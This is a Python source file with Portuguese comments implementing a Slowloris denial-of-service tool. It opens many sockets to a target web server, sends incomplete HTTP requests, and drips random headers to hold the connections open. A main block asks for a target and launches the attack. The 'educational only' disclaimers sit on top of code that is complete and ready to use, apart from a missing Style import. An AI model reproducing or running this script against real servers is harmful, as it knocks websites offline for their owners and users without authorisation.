#!/usr/bin/env python3
# tools/slowloris.py

import socket
import threading
import time
import random
from colorama import Fore, init

init(autoreset=True)

class Slowloris:
    """
    Ataque Slowloris - mantém conexões HTTP abertas
    APENAS PARA FINS EDUCACIONAIS
    """
    
    def __init__(self, target, port=80, sockets=200, duration=60):
        """
        Inicializa ataque Slowloris
        
        Args:
            target: IP ou domínio alvo
            port: Porta (padrão 80)
            sockets: Número de sockets para manter abertos
            duration: Duração em segundos
        """
        self.target = target
        self.port = port
        self.max_sockets = sockets
        self.duration = duration
        self.running = False
        self.sockets = []
        
        # Resolver DNS
        try:
            socket.inet_aton(target)
            self.ip = target
        except socket.error:
            try:
                self.ip = socket.gethostbyname(target)
                print(f"{Fore.CYAN}[*] Domínio resolvido: {self.ip}")
            except:
                print(f"{Fore.RED}[!] Não foi possível resolver o domínio")
                raise
        
        # Headers HTTP para manter conexão viva
        self.headers = [
            "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Accept-language: pt-BR,pt;q=0.9,en;q=0.8",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Keep-Alive: 900"
        ]
    
    def create_socket(self):
        """Cria um novo socket e envia headers parciais"""
        try:
            # Criar socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            
            # Conectar
            sock.connect((self.ip, self.port))
            
            # Enviar requisição parcial
            request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            
            # Adicionar headers aleatórios
            for header in self.headers:
                request += header + "\r\n"
            
            # Não enviar \r\n final para manter conexão aberta
            sock.send(request.encode())
            
            return sock
            
        except Exception as e:
            return None
    
    def attack_worker(self):
        """Mantém as conexões vivas"""
        while self.running:
            for i, sock in enumerate(self.sockets):
                try:
                    # Enviar headers aleatórios para manter conexão
                    random_header = f"X-{random.randint(1, 1000)}: {random.randint(1, 1000)}\r\n"
                    sock.send(random_header.encode())
                    
                except Exception:
                    # Socket morreu, remover da lista
                    try:
                        self.sockets.remove(sock)
                    except:
                        pass
            
            # Preencher sockets que morreram
            while len(self.sockets) < self.max_sockets and self.running:
                new_sock = self.create_socket()
                if new_sock:
                    self.sockets.append(new_sock)
                    print(f"{Fore.GREEN}[+] Socket criado. Total: {len(self.sockets)}")
                else:
                    print(f"{Fore.RED}[-] Falha ao criar socket")
                    time.sleep(0.5)
            
            time.sleep(10)  # Enviar headers a cada 10 segundos
    
    def start(self):
        """Inicia o ataque Slowloris"""
        print(f"""
{Fore.RED}╔════════════════════════════════════════╗
║        INICIANDO SLOWLORIS             ║
╠════════════════════════════════════════╣
║ Alvo: {self.ip:<19} ║
║ Porta: {self.port:<24} ║
║ Sockets: {self.max_sockets:<21} ║
║ Duração: {self.duration}s {' ' * 19}║
╚════════════════════════════════════════╝{Style.RESET_ALL}
        """)
        
        self.running = True
        
        # Criar socket inicial
        print(f"{Fore.CYAN}[*] Criando sockets iniciais...")
        for _ in range(min(50, self.max_sockets)):
            sock = self.create_socket()
            if sock:
                self.sockets.append(sock)
            time.sleep(0.1)
        
        print(f"{Fore.GREEN}[✓] {len(self.sockets)} sockets criados")
        
        # Iniciar thread mantenedora
        t = threading.Thread(target=self.attack_worker)
        t.daemon = True
        t.start()
        
        # Monitorar
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                remaining = self.duration - elapsed
                print(f"{Fore.CYAN}[⏱️] {elapsed}s decorridos | {remaining}s restantes | Sockets: {len(self.sockets)}")
        
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}\n[!] Ataque interrompido")
        
        finally:
            self.stop()
    
    def stop(self):
        """Para o ataque"""
        self.running = False
        
        # Fechar todos os sockets
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        
        self.sockets.clear()
        print(f"{Fore.GREEN}[✓] Slowloris finalizado")

if __name__ == "__main__":
    # Teste
    print(f"{Fore.RED}⚠️  APENAS PARA TESTES AUTORIZADOS!")
    target = input("Alvo: ")
    if target:
        attack = Slowloris(
            target=target,
            port=80,
            sockets=100,
            duration=30
        )
        attack.start()
